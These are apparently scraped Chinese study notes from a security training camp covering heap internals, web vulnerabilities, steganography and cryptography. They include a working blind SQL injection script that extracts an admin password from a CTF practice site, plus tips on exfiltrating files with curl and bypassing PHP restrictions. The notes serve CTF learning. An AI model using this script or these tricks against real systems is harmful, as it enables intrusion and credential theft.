可见源码中直接定义了一个后者的一个对象 tcache，假设前者有两个垃圾对象，其内存布局大致如下：\n tcache_perthread_struct *tcache | | v +---------------------------+---+ 2*64 | uint16_t counts[64] | 0 |\u0026lt;----------------------------------------------+\r+-------------------------------- |\r| 2 | |\r----- |\r|...| |\r----- |\r| 0 | |\r----- |\r| 0 | |\r+---------------------------+------+ |\r4*64 | tcache_entry *entries[64] | null | |\r+----------------------------------- +------------------------------+ |\r| ptr |----\u0026gt;| tcache_entry *next |-+ |\r-------- -------------------------------- | |\r| ... | | tcache_perthread_struct *key |-|-----+\r-------- +------------------------------+ | |\r| null | +-----------------------------------+ |\r-------- | +------------------------------+ |\r| null | +-\u0026gt;| tcache_entry *next |-\u0026gt;null |\r+------+ -------------------------------- |\r| tcache_perthread_struct *key |-------+\r+------------------------------+ tcache_get \u0026amp;\u0026amp; tcache_put #  两个比较重要的函数，tcache_get() 与 tcache_put()：\n/* Caller must ensure that we know tc_idx is valid and there\u0026#39;s room for more chunks. */ static __always_inline void tcache_put (mchunkptr chunk, size_t tc_idx) { tcache_entry *e = (tcache_entry *) chunk2mem (chunk); /* Mark this chunk as \u0026#34;in the tcache\u0026#34; so the test in _int_free will detect a double free. */ e-\u0026gt;key = tcache; e-\u0026gt;next = tcache-\u0026gt;entries[tc_idx]; tcache-\u0026gt;entries[tc_idx] = e; ++(tcache-\u0026gt;counts[tc_idx]); } /* Caller must ensure that we know tc_idx is valid and there\u0026#39;s available chunks to remove. */ static __always_inline void * tcache_get (size_t tc_idx) { tcache_entry *e = tcache-\u0026gt;entries[tc_idx]; tcache-\u0026gt;entries[tc_idx] = e-\u0026gt;next; --(tcache-\u0026gt;counts[tc_idx]); e-\u0026gt;key = NULL; return (void *) e; }  前者将一个元素插入了单向链表的头部，并且将对应位置的 counts 大小自增一； 后者单向链表头部节点取出并返回，并且将对应位置的 counts 大小自减一。  _int_free #  在内存释放的 free 函数中，对 tcache 的相关调用只有以下的一处，该处在函数的最开始执行：\n#if USE_TCACHE  { size_t tc_idx = csize2tidx (size); if (tcache != NULL \u0026amp;\u0026amp; tc_idx \u0026lt; mp_.tcache_bins) { /* Check to see if it\u0026#39;s already in the tcache. */ tcache_entry *e = (tcache_entry *) chunk2mem (p); /* This test succeeds on double free. However, we don\u0026#39;t 100% trust it (it also matches random payload data at a 1 in 2^\u0026lt;size_t\u0026gt; chance), so verify it\u0026#39;s not an unlikely coincidence before aborting. */ if (__glibc_unlikely (e-\u0026gt;key == tcache)) { tcache_entry *tmp; LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx); for (tmp = tcache-\u0026gt;entries[tc_idx]; tmp; tmp = tmp-\u0026gt;next) if (tmp == e) malloc_printerr (\u0026#34;free(): double free detected in tcache 2\u0026#34;); /* If we get here, it was a coincidence. We\u0026#39;ve wasted a few cycles, but don\u0026#39;t abort. */ } if (tcache-\u0026gt;counts[tc_idx] \u0026lt; mp_.tcache_count) { tcache_put (p, tc_idx); return; } } } #endif 可见，在执行 tcache_put 操作之前，函数主要进行了三个检测：\n 当前的 tcache 存在，并且目标块的大小在范围内； 目标块的 key 是否指向了 tcache，若已经指向了目标地址，则有可能是 Double Free； 目标的垃圾箱链表长度是否已经达到上限（源码中将上限定义为 7）。  _int_malloc #  而在内存分配的 malloc 函数中，对 tcache 的调用有五处，根据 ctf-wiki 中的介绍，主要有以下的几点：\n  首先，申请的内存块符合 fastbin 大小时并且找到在 fastbin 内找到可用的空闲块时，会把该 fastbin 链上的其他内存块放入 tcache 中。\n  其次，申请的内存块符合 smallbin 大小时并且找到在 smallbin 内找到可用的空闲块时，会把该 smallbin 链上的其他内存块放入 tcache 中。\n  当在 unsorted bin 链上循环处理时，当找到大小合适的链时，并不直接返回，而是先放到 tcache 中，继续处理。\n  "},{"id":31,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day12/","title":"Day12","section":"xman3","content":"漏洞挖掘 #  XSS #   XSS自动化挖掘。重点在于输入与输出。  SQl注入 #   Cookie、header、url、请求参数中均有可能触发。  PS：mysql常见的延时注入的函数：sleep、benchmark（重复执行同一个函数）   sql注入的关键：如何闭合sql语句  SSRF与URL跳转 #   大部分SSRF、URL跳转漏洞触发在请求参数中。 redis是支持内网的常见服务，可以利用dict与gopher协议与之通信。  "},{"id":32,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day13/","title":"Day13","section":"xman3","content":"Https下的Web同源安全问题研究 #  XSS #  Cookie基础 → 同源策略 #   Cookie SOP相比Web SOP：  仅以domain/path作为同源限制 不区分端口 不区分HTTP/HTTPs    下午 #  CRLF注入 #   \\r\\n分割  Web Server的运行方式 #  Apache #   默认prefork mode 同一个连接用同一个进程处理 mod_php  Nginx #   event-driven 同一个连接请求用不同的线程处理 php-fpm  php disabled function绕过 #   /proc/self/mem → 可以修改当前进程的内存 修改got 命令执行！  访问头 #   X-Forwarded-For  很多程序员用X-Forward-For来获取用户IP 在HTTP请求头中可以伪造    响应头 #   X-XSS-Protection  一定程度上禁止反射性XSS攻击    "},{"id":33,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day15/","title":"Day15","section":"xman3","content":"无线攻防 #  Fake AP #  "},{"id":34,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day2/","title":"Day2","section":"xman3","content":"MISC #  0x00: Recon #   信息搜集 → 社会工程学  0x01: Encode #   What is encoding? (From Stack-Overflow)  The only thing that a computer can store is bytes. To store anything in a computer, you must first encode it. An encoding is a format to represent audio, images, text, etc in bytes.    二进制编码 #    Python中与二进制相关的类型转化：\n  二进制字符串与十进制整型变量的相互转化：\ndec_integer = int(\u0026#39;110\u0026#39;,2) # or \u0026#39;0b110\u0026#39; bin_integer = bin(6) # 类似的 hex(6)可以转化为16进制   PS：Python3中有Bytes类型的概念，可以用于做不同字符串编码格式的中介，比如：\nb\u0026#39;\\xe4\\xbd\\xa0\\xe5\\xa5\\xbd\u0026#39;.decode(\u0026#34;utf-8\u0026#34;) # 通过指定的方式解码二进制bytes类型数据 \u0026#39;你好\u0026#39;.encode(\u0026#34;utf-8\u0026#34;) # 通过指定的方式将字符串编码成二进制bytes类型数据 b\u0026#39;HelloWorld\u0026#39;.decode() # UTF-8是默认解码方式     CTF中有ASCII码、二维码、字符画等考察形式，也可以用任意两个符号来表示（比如：tab与space、莫斯电码）。\n  Base64编码 #   What is base64?  From Wikipedia → Base64 is a group of similar binary-to-text encoding schemes that represent binary data in an ASCII string format by translating it into a radix-64 representation. 自己总结 → BASE64是一种将二进制串编码成可见字符的一种编码方式。其区别于普通编码方式的最大不同之处是采用6位一组的编码方式 $$2^{6}=64$$ 。   Base64转码大致流程如下：  graph TB;\rsubgraph 原始串=\u0026gt;BASE64串\rRaw[原始字符串,比如HelloWorld]--\u0026gt;|指定编码方式,比如ASCII|Temp(BYTES串,比如0x48656c6c6f576f726c64);\rTemp--\u0026gt;|BASE64编码|Res[BASE64转码字符串,比如SGVsbG9Xb3JsZA==];\rend\rsubgraph BASE64编码\rS1[8N长度的BYTES串,比如80]--\u0026gt;|末尾补0Padding,比如补16个|S2[24N'长度的BYTES串,比如96]\rS2--\u0026gt;|6位一组BASE64编码|S3[BASE64编码字符串]\rend\rTemp--\u0026gt;S1;S3--\u0026gt;Res\r  Base64的编码结果可以用如下正则表达式表示（From Stack-Overflow）：\n^(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?$\r  base64 解码工具：\n  Python中的Base64相关编码库（python3中还有一个叫b85encode，实际为对base64的扩展）\nfrom base64 import b64encode b64encode(b\u0026#34;HelloWorld\u0026#34;) # 将Bytes类型数据通过base64方式编码，返回一个Bytes类型串 # 返回串通过Python的默认UTF-8方式解码即为base64的编码结果 from base64 import b64decode b64decode(b\u0026#39;SGVsbG8gV29ybGQ=\u0026#39;) # 将一个Bytes类型数据或者一个base64字符串通过base64方式解码，返回一个Bytes类型串   bash中的base64工具与openssl工具，或直接使用命令行中的python命令\necho HelloWorld | base64 echo SGVsbG9Xb3JsZAo= | base64 --decode # coreutils package 中的 base64 模块接受一个文件作为输入 # 默认模式为编码，--decode 选项声明或 -d 选项声明后，对base64进行解码 openssl enc -base64 \u0026lt;\u0026lt;\u0026lt; \u0026#34;HelloWorld\u0026#34; openssl enc -base64 -d \u0026lt;\u0026lt;\u0026lt; \u0026#34;SGVsbG9Xb3JsZAo=\u0026#34; # 使用 openssl 程序中的 enc 模块， 指定 base64 进行编码解码。同base64模块，也为文件输入。 # 默认模式为编码（或-e选项），-d选项声明后为解码。 echo HelloWorld | python -m base64 echo SGVsbG9Xb3JsZAo= | python -m base64 -d # 可以在bash中使用python对程序进行编码解码，-d选项声明后为解码     Base64隐写\n  原理：Base64在解码的过程中会首先检测=的个数，然后直接忽略默认为0的base64码尾部。\n  流程：base64 → 解码 → 编码 → 出现不一致信息\nb64chars = \u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#39; with open(\u0026#39;text.txt\u0026#39;, \u0026#39;rb\u0026#39;) as f: bin_str = \u0026#39;\u0026#39; for line in f.readlines(): stegb64 = \u0026#39;\u0026#39;.join(line.split()) rowb64 = \u0026#39;\u0026#39;.join(stegb64.decode(\u0026#39;base64\u0026#39;).encode(\u0026#39;base64\u0026#39;).split()) offset = abs(b64chars.index(stegb64.replace(\u0026#39;=\u0026#39;,\u0026#39;\u0026#39;)[-1])-b64chars.index(rowb64.replace(\u0026#39;=\u0026#39;,\u0026#39;\u0026#39;)[-1])) equalum = stegb64.count(\u0026#39;=\u0026#39;) if equalum: bin_str += bin(offset)[2:].zfill(equalum * 2) print(\u0026#39;\u0026#39;.join([chr(int(bin_str[i:i+8], 2)) for i in xrange(0, len(bin_str), 8)]))     其他编码方式 #    图形码 → 在线工具\n  二维码：（1）CTF：二维码的修复 → 黑白取反；（2）二维码结构示意图：\n  攻击实践 #   rbash（restricted bash） → 限制命令使用的bashshell  直接tab → 显示可用的所有命令 没有回显 → curl命令把文件post到自己的服务器上    0x02: Forensic\u0026amp;Steg 隐写矩阵 #  前置技能 #    Python → 字符串处理、二进制数据处理、文件处理(Zip、Png、PCAP)、网络编程(socket, pwntools)\n  What is magic number? (From Wikipedia)\n A constant numerical or text value used to identify a file format or protocol.    Tools\n  File(Linux bash), trid(Windows cmd), 用来鉴定文件类型\nfile input_file # The file command attempts to classify each filesystem object (i.e., file, directory or link) that is provided to it as an argument (i.e., input)   Strings, 查看文件中的可见字符串\nstrings [OPTIONS] FILENAME # The Strings command basically prints the strings of printable characters in files.   binwalk, foremost, dd 用于分析文件，自动切割文件\nbinwalk image.jpg # 使用 binwalk 分析文件 dd if=in_image.jpg of=out_image.jpg skip=140147 bs=1 # 使用 dd 命令分离隐藏文件。if 指定输入文件，of 指定输出文件，skip 指定分离头位置，bs 设置每次读写块的大小为 1 个字节 foremost image.jpg # 使用 foremost 命令直接分离文件   Winhex, 010Editor → 分析文件的十六进制\n  grep, awk, 关键信息的检索提取\n    图片处理 #    MetaData(Wikipedia: Metadata is data that provides infoemation about other data.)\n Identifiy：获取图形文件的格式与特性 → https://www.imagemagick.org/script/escape.php strings ExifTools    处理图片的Python库：\n  import PIL from image  jpg图片  文件格式：  标记码（两个字节构成：第一位0xFF，第二位不同有不同含义） 压缩数据：前两个字节表示包括这两个字节的整个段的长度   利用文件格式隐藏信息  在文件尾部的App1数据区插入，MagicEXIF 每段开始前，COM注释   常用工具：JPHIDE隐写，stegdetect检测隐写   png文件   png文件格式构成\n  利用文件格式隐藏信息\n 文件头插入信息 → 破坏文件头，需要修复以识别为png → hexdump -C ctf.png|more IDAT段有长度上限，超过填入下一段 → 在文件结束后人为加入IDAT段 → 不打破原图片的情况下实现数据隐写 IEND段 LSB隐写：最低有效位 → 在颜色码的最后一位加入信息，肉眼一般无法识别  只适用于png这种无损压缩手段，jpg的压缩方式会损失信息      常用工具：pngcheck，Stegsolve(图片通道查看器，图片隐写必备)，010Editor\n   gif文件  gif在线编辑器：http://ezgif.com/split 时间轴：Identifiy -format \u0026quot;%s %T \\n\u0026quot; 100.gif 分割命令：convert   音频类：频谱、波形 zip文件  zip爆破 → ARCHPR(windows)，fcrackzip 伪加密 → 修改加密标志位，zipCenOp(检测伪加密jar工具) CRC32碰撞 明文攻击（已知一段加密信息的明文） → http://www.unix-ag.uni-kl.de/~conrad/krypto/pkcrack.html   流量分析  协议：http、https、dns、ftp 隐藏数据 数据提取 → 手工提取：Python(pcapy)、Tshark(-r **.pcap -Y ** -T fields -e **) usb键鼠数据提取 工具：pcapfix(文件修复)、wireshark(协议分析)、tshark(数据提取)、xxd(把二进制流打包成文件)、egrep   内存文件  Volatility → 进程、文件、用户    0x03: Take a Look #    About Python → pyc文件 → dis模块读取指令\n Python3.6以上的文件DeadZone无参指令也会占用一个字节的参数空间 Sandbox Escape → pysandbox → python沙箱的构造    pdf隐写(wbStego4)、html隐写\n  磁盘文件、系统镜像\n 取证工具：EasyRecovery、FTK、TSK    视频文件，字幕攻击\n  工控：协议\n  0x04: Misc+ #  "},{"id":35,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day3/","title":"Day3","section":"xman3","content":"密码学Day1 #  密码学简介 #   一般来说，密码学的设计者根本目标是保障信息以及信息系统的以下几个方面的特性：  机密性（Confidentiality）、完整性（Integrity）、可用性（Availability）、认证性（Authentication）、不可否认性（Non-repudiation） 前三者又被称为信息安全的CIA三要素   一般来说，我们都会假设攻击者已知待破解的密码体制，而攻击类型通常分为以下四种：  唯密文攻击：只拥有密文 已知明文攻击：拥有密文与对应的明文 选择明文攻击：拥有加密权限，能够对明文加密后获得相应密文 选择密文攻击：拥有解密权限，能够对密文解密后获得响应明文    古典密码 #  单表代换加密 #   一般有以下两种方式来进行破解：  在密钥空间较小的情况下，采用暴力破解的方式。 在密文长度足够长的时候使用词频分析。   分类：凯撒密码、移位密码、AtbashCipher、简单替换密码、仿射密码。下面关于仿射密码：  仿射密码 #   仿射密码的加密函数是：$$ E(x) = (ax+b) \\mod m $$。其中：  x 表示明文按照某种编码得到的数字 。 a与m互质。 m是编码系统中字母的数目。   仿射密码的解密函数是：$$ D(x) = a^{-1}*(x-b) \\mod m $$。其中：  $$a^{-1}$$ 是 a 在群 $$\\mathbb{Z}_{m}$$ 的乘法逆元。    多表代换加密 #    Polybius（棋盘密码） → 将给定的明文加密为两两组合的数字。\n  Vigenere（维吉尼亚密码） → 维吉尼亚密码的破解\n  Hill（希尔密码） → 将给定的明文编码转化为n维向量，跟一个 n × n 的矩阵相乘，再将得出的结果对字符集大小N取模。\n Notice：用作加密的矩阵（密匙）在 $$\\mathbb{Z}_{26}^{n}$$ 必须是可逆的，也就是说矩阵的行列式与N互质。    AutokeyCipher（自动密钥密码） → 与维吉尼亚密码类似，但使用不同的方法生成密钥。\n  其他古典加密 #    培根密码 → 使用两种不同的字体，代表 0 和 1，结合加密表进行加解密。\n  栅栏密码（分组重组）、曲路密码、列移位密码、01248密码（云影密码）、JSFuck、猪圈密码、舞动的小人密码（出自福尔摩斯探案集）、键盘密码\n  PostScript：自己总结，在分析时略去字符到数字的编码过程，直接使用数字进行分析，能简化大量思考\n  练习题目 #    2017 SECCON Vigenere3d\n  关于此题的分析：\n  考虑到在程序正常运行下，数组访问不会越界，我们在讨论时做以下约定：$$ arr[index] \\Leftrightarrow arr[index % len(arr)] $$\n  关于python程序中定义的 _l 函数，发现以下等价关系：$$ _l(offset, arr)[index] \\Leftrightarrow arr[index + offset] $$\n  关于python的main函数中三维矩阵t的定义，发现以下等价关系：$$ t[a][b][c] \\Leftrightarrow _l(a+b, s)[c] $$\n  综合第2第3点的观察，有如下等价关系：$$ t[a][b][c] \\Leftrightarrow s[a+b+c] $$\n  我们将s视为一种编码格式，即：编码过程s.find(x)，解码过程s。并直接使用其编码结果的数字替代其所代指的字符串，那么加密过程可以用以下公式表示：\n $$ e = f + k1 +k2 $$ 其中，e是密文，f是明文，k1与k2是通过复制方法得到、与f长度一样的密钥，加法是向量加。      所以我们只需要通过计算 k1+k2 ，模拟密钥，即可解密。关于此题的解密python脚本：\nenc_str = \u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_{}\u0026#39; dec_dic = {k:v for v,k in enumerate(enc_str)} encrypt = \u0026#39;POR4dnyTLHBfwbxAAZhe}}ocZR3Cxcftw9\u0026#39; flag_bg = \u0026#39;SECCON{**************************}\u0026#39; sim_key = [dec_dic[encrypt[i]]-dec_dic[flag_bg[i]] for i in range(7)] # 破解模拟密钥 sim_key = sim_key + sim_key[::-1] flag_ed = [dec_dic[v]-sim_key[k%14] for k,v in enumerate(encrypt)] # 模拟密钥解密 flag_ed = \u0026#39;\u0026#39;.join([enc_str[i%len(enc_str)] for i in flag_ed]) # 解码 print(flag_ed)   流密码 #    逐字节或者逐比特处理信息。一般来说：\n 流密码密钥长度与明文长度相同。 流密码派生自一个较短的密钥，派生算法通常为一个伪随机数生成算法。    流密码的关键在于设计好的伪随机数生成器。一般来说，伪随机数生成器的基本构造模块为反馈移位寄存器。伪随机数生成器（PRNG），依赖于初始值（也称种子）\n 分类：线性同余生成器（LCG）、线性回归生成器\u0026hellip;    伪随机数生成器 #    伪随机数生成器（pseudorandom number generator，PRNG），又称为确定性随机位生成器（deterministic random bit generator，DRBG），是用来生成接近于绝对随机数序列的数字序列的算法。\n  随机性的严格性：\n 随机性：随机数应该不存在统计学偏差，是完全杂乱的数列。→ 弱伪随机数。 不可预测性：不能从过去的序列推测出下一个要出现的数字。→ 强伪随机数。 不可重现性：除非数列保存下来，否则不能出现相同的数列。→ 真随机数。    PRNG的周期：对于一个PRNG的所有可能起始状态，不重复序列的最长长度。\n  目前通用的伪随机数生成器主要有：线性同余生成器（LCG）、线性回归发生器、MersenneTwister、XorshiftGenerator、WELL family of generators、线性反馈移位寄存器（LFSR）\n  密码学安全伪随机数生成器（cryptographically secure pseudo-random number generator, CSPRNG）或密码学伪随机数生成器（CPRNG），是一种特殊的伪随机数生成器。\n 关于 CPRNG 的需求：  通过统计随机性测试。通过 next-bit test ，也就是说知道了一个序列的前 k 个比特，攻击者不可能在多项式时间内以大于50%的概率预测出来下一个比特位。 必须能够足够强的攻击。比如当生成器的部分初始状态或者运行时的状态被攻击者获知时，攻击者仍然不能够获取泄露状态之前生成的随机数。   分类：基于密码学算法、基于数学难题、某些特殊目的的设计。    线性同余发生器 #  线性同余发生器（linear congruential generator, LCG）是一种通过不连续线性函数生成伪随机数列的算法。生成器通过以下迭代关系定义：$$ X_{n+1} = (aX_n+c) \\mod m $$，其中：\n m \u0026gt; 0, the \u0026ldquo;modulus\u0026rdquo; 0 \u0026lt; a \u0026lt; m, the \u0026ldquo;multiplier\u0026rdquo; 0 ≤ c \u0026lt; m, the \u0026ldquo;increment\u0026rdquo; 0 ≤ X0 \u0026lt; m, the \u0026ldquo;seed\u0026rdquo; or \u0026ldquo;start value\u0026rdquo;  当 c=0 时，发生器又称作乘法同余发生器（multiplicative congruential generator, MCG）或 Lehmer RNG。\n当 c≠0 时，发生器又称作混合同余发生器（mixed congruential generator）\n反馈移位寄存器 #  一般情况下，其生成关系可以用以下公式表示：$$ a_{i+n} = F(a_i, a_{i+1}, \u0026hellip;, a_{i+n-1}) $$，其中：\n $$ a_0, a_1, \u0026hellip;, a_{n-1} $$ 为初态 F 称为反馈函数或反馈逻辑。如果 F 为线性函数，那么我们称其为线性反馈移位寄存器（linear-feedback shift register, LFSR）。  线性反馈移位寄存器 LFSR #  反馈函数一般如下：$$ a_{i+n} = \\sum\\limits_{j=1}^{n}c_j a_{i+n-j} $，其中 $c_j$ 均在某个有限域 $F_q$$ 中。\n该线性变化对应的矩阵为：$$ \\left[ \\begin{matrix} 0 \u0026amp; 0 \u0026amp; \\cdots \u0026amp; 0 \u0026amp; c_n \\ 1 \u0026amp; 0 \u0026amp; \\cdots \u0026amp; 0 \u0026amp; c_{n-1} \\ 0 \u0026amp; 1 \u0026amp; \\cdots \u0026amp; 0 \u0026amp; c_{n-2} \\ \\vdots \u0026amp; \\vdots \u0026amp; \\ddots \u0026amp; \\vdots \u0026amp; \\vdots \\ 0 \u0026amp; 0 \u0026amp; \\cdots \u0026amp; 1 \u0026amp; c_1 \\ \\end{matrix} \\right] $$\n即：$$ \\left[ \\begin{matrix} a_{i+1} \u0026amp; a_{i+2} \u0026amp; a_{i+3} \u0026amp; \\cdots \u0026amp; a_{i+n} \\end{matrix}\\right] = \\left[ \\begin{matrix} a_{i} \u0026amp; a_{i+1} \u0026amp; a_{i+2} \u0026amp; \\cdots \u0026amp; a_{i+n-1} \\end{matrix}\\right] \\left[ \\begin{matrix} 0 \u0026amp; 0 \u0026amp; \\cdots \u0026amp; 0 \u0026amp; c_n \\ 1 \u0026amp; 0 \u0026amp; \\cdots \u0026amp; 0 \u0026amp; c_{n-1} \\ 0 \u0026amp; 1 \u0026amp; \\cdots \u0026amp; 0 \u0026amp; c_{n-2} \\ \\vdots \u0026amp; \\vdots \u0026amp; \\ddots \u0026amp; \\vdots \u0026amp; \\vdots \\ 0 \u0026amp; 0 \u0026amp; \\cdots \u0026amp; 1 \u0026amp; c_1 \\ \\end{matrix} \\right] $$\n我们可以求得其特征多项式：（我们一般讨论 $$ \\mathbb{Z}2 $$ 上的多项式）$$ f(x)=x^n-\\sum\\limits{i=1}^{n}c_ix^{n-i} $$\n同时我们定义其互反多项式：$$ \\overline f(x) = x^n f(\\frac{1}{x}) = 1-\\sum\\limits_{i=1}^{n} c_i x^i ​$$，也称为LFSR的联结多项式。\n 该序列对应的生成函数为：$$ A(x) = \\frac{p(x)}{\\overline f(x)} $，其中：$ p(x) = \\sum\\limits_{i=1}^{n} (c_{n-i} x^{n-i} \\sum\\limits_{j=1}^{i} a_j x^{j-1}) $$ 该序列对应的周期或阶为：使 $$ A(x) | (x^T - 1) $$ 的最小 T  n 次本原多项式：阶为 $$ 2^n - 1 $$ 的 n 次不可约多项式。\nm 序列：达到最长周期的序列。\n 序列是 m 序列 $$ \\Leftrightarrow $$ 序列的极小多项式是 n 次本原多项式。  非线性反馈移位寄存器 NLFSR #   非线性组合生成器，对多个 LFSR 的输出使用一个非线性组合函数 非线性滤波生成器，对一个 LFSR 的内容使用一个非线性组合函数 钟控生成器，使用一个（或多个）LFSR 的输出来控制另一个（或多个）LFSR 的时钟。  特殊流密码 RC4 #  块加密 #  块加密即每次加密一块明文，常见的加密算法有：IDEA、DES、AES 等，块加密也是对称加密。\nShannon 提出的两大设计分组密码的策略：混淆与扩散。\n 混淆 Confusion，将明文与密钥之间的统计关系变得尽可能复杂。常见的方法：S 盒、乘法。 扩散 Diffusion，使明文中的每一位影响密文中的许多位。常见的方法：线性变换、置换、（循环）移位。  轮函数（round function）：被块加密重复使用的可逆变换函数。目前主要有以下设计方法：\n Feistel Network，由 Horst Feistel 发明 → DES Substitution-Permutation Network (SPN) → AES  ARX - Add-Rotate-Xor #  DES - Data Encryption Standard #  下图为一个简单的 DES 流程图：\n每一轮的加密过程大致如下：\n  $$ L_{i+1} = R_i $$\n  $$ R_{i+1} = L_i \\oplus F(R_i, K_i) $$\n  因此每一轮的解密过程亦可推出：\n  $$ L_i = R_{i+i} \\oplus F(L_{i+1}, K_i) $$\n  $$ R_i = L_{i+1} $$\n  IDEA - International Data Encryption Algorithm #  AES - Advanced Encryption Standard #  Simon \u0026amp; Speck #  "},{"id":36,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day4/","title":"Day4","section":"xman3","content":"密码学Day2 #  模数攻击 #  "},{"id":37,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day5/","title":"Day5","section":"xman3","content":"Web Day1 #  所需知识 #    HTTP抓包/修改：Http请求、响应流程\n  web前端：Cookie、缓存、跨域问题、编码（url编码、html实体编码、js编码）\n  web后端：php → 官方文档；Python → 廖雪峰Python教程\n  数据库与服务器\n  常见的web漏洞：XSS、SQL注入、CSRF、SSRF、命令执行、XXE、文件上传/包含/写入、反序列化、未授权访问、目录遍历、业务逻辑漏洞\n  工具：Sqlmap、Burpsuit、Hackbar、Proxy SwitchyOme、Postman\u0026hellip;\n  Http请求 #  Http请求响应 #   请求包格式 → 请求头格式：请求方法 + url/path + 协议版本     GET请求 → 从指定的资源请求数据 → 可以被缓存，有长度限制 POST请求 → 向指定的资源提交要被处理的数据 → 不会被缓存，没有长度限制 响应包 → 响应头：响应协议+状态码；响应主体：html代码   PHP后端获取请求头：$_SERVER['HTPP_USER_AGENT']     常见请求头说明：  Content-Length：请求长度，为了告诉服务器有多长（有时没有，使用一些分隔符指明长度）    题目类型 #    入门题目\n 查看源码（view-source://www.baidu.com） 查看请求响应包（chrome开发者工具栏） 文件泄露  备份文件泄露：.index.php.swp、.index.php.swo、.index.php.bak、.index.php~ 源码压缩包： git/svn泄露：利用工具GitHack、dvcs-ripper，可以获取网站源码 其他文件泄露：.idea（使用intellij idea工程），.DS_Store（OS X下，可泄露文件），.pyc文件   JSfuck：利用js的弱类型特性，拼接字符串作为js代码运行 → 直接贴到chrome的开发者工具中即可运行 请求修改、重放：请求头、请求包、Cookie    常规题目\n  一个存在漏洞的网站\n  SQL注入：拿到数据库中的flag\n  命令执行、文件上传：拿到服务器上的flag\n  拿到管理员的cookie → flag在cookie中（XSS）\n  XXE简介（https://thief.one/2017/06/20/1/，https://www.leavesongs.com/PENETRATION/slim3-xxe.html），xml外部实体注入 → SSRF\n  其他一些漏洞利用（条件竞争、SSRF、XXE）\n    XXE简介 #  ​\n"},{"id":38,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day6/","title":"Day6","section":"xman3","content":"Web Day2 #  sql注入 #    sql盲注脚本\nimport requests import re import sys p = re.compile(r\u0026#39;\u0026#39;\u0026#39;ID: (.+?)\u0026amp;nbspx:\u0026#39;\u0026#39;\u0026#39;) ans = \u0026#39;\u0026#39; for pos in range(1,33): l = 0 r = 127 cookies = {\u0026#34;PHPSESSID\u0026#34;:\u0026#34;tf7511brt2272n9ne5i8dj6o35\u0026#34;} data = {\u0026#34;x\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;y\u0026#34;: \u0026#34;1\u0026#34;} while l\u0026lt;r: mid = int((l+r)/2) resp = requests.post( \u0026#34;https://web.ctflearn.com/grid/controller.php?action=add_point\u0026#34;, data=data, cookies=cookies).text resp = requests.get(\u0026#34;https://web.ctflearn.com/grid/\u0026#34;, cookies=cookies).text _id = p.search(resp).group(1) payload = _id + \u0026#39; and ord(mid((select password from user where username=\u0026#34;admin\u0026#34; limit 0, 1), \u0026#39; + str(pos) + \u0026#39;,1))\u0026gt;\u0026#39; + str(mid) length = len(payload) resp = requests.get(\u0026#39;\u0026#39;\u0026#39;https://web.ctflearn.com/grid/controller.php?action=delete_point\u0026amp;point=O:5:\u0026#34;point\u0026#34;:3:{s:1:\u0026#34;x\u0026#34;;s:1:\u0026#34;1\u0026#34;;s:1:\u0026#34;y\u0026#34;;s:1:\u0026#34;1\u0026#34;;s:2:\u0026#34;ID\u0026#34;;s:\u0026#39;\u0026#39;\u0026#39;+str(length)+\u0026#39;\u0026#39;\u0026#39;:\u0026#34;%s\u0026#34;;}\u0026#39;\u0026#39;\u0026#39;%payload,cookies=cookies,allow_redirects=False).text resp = requests.get(\u0026#34;http://web.ctflearn.com/grid/\u0026#34;,cookies=cookies).text if _id not in resp: l = mid+1 else: r = mid if l==0: break ans = ans + chr(l) print(ans)   XSS攻击与防御 #  Cookie #   获取cookie的方法：浏览器端（客户端） → document.cookie；服务器端（PHP） → $_COOKIE[] PS：服务器端的一个响应包中只能包含一个set-cookie Chrome的Windows Cookie的位置：AppData\\Local\u0026hellip; Cookie属性 → 分号分隔的键值对  domain只可以设置为页面本身或其子页面、不能设置为顶级域名    XSS漏洞 #   简介：攻击者可以在页面上插入html代码，通过javaScript得到受害者信息。分类：  反射性：用户请求的中的参数直接输出到了页面中，形成XSS 存储性（评论功能）：将用户提交的评论存储在数据库的表中 → 从数据库中取出来直接显示在评论区中 DOM性：页面中的源码中并无XSS攻击向量   危害：窃取信息、XSS蠕虫、命令执行  命令执行：特权域XSS → WooYun-2016-170984；沙盒绕过 → CVE-2017-12581   编码：  HTML实体编码：符号的功能性编码与显示编码分离 → DOM元素的属性值会自动解码HTML编码 URL编码：后端需要进行一个decode 页面编码：利用gbk编码漏洞 → 转移符\\在gbk中的低字节位，如果在前面插入一个单字节高位字节，组合成一个合法字符，可以用于逃逸\\   XSS漏洞注入点 XSS注入的一些小trick：  过滤\u0026quot;.\u0026quot;，使用with语句；过滤';'，用换行 url协议头可以去掉，如//example.com(http) HTML实体编码中，';'可以去掉 可以利用拼接eval函数执行代码，例如：\u0026quot;a\u0026quot;+eval(\u0026quot;alert(1)\u0026quot;)   hidden元素XSS  CTF中的XSS题目 #    绕过（例子：HCTF2016 guestbook）\n  课上习题2：\n 爆破md5：  \u0026lt;?php $i = 0; while(1){ if(substr(md5($i),0,6) === \u0026#39;966150\u0026#39;) 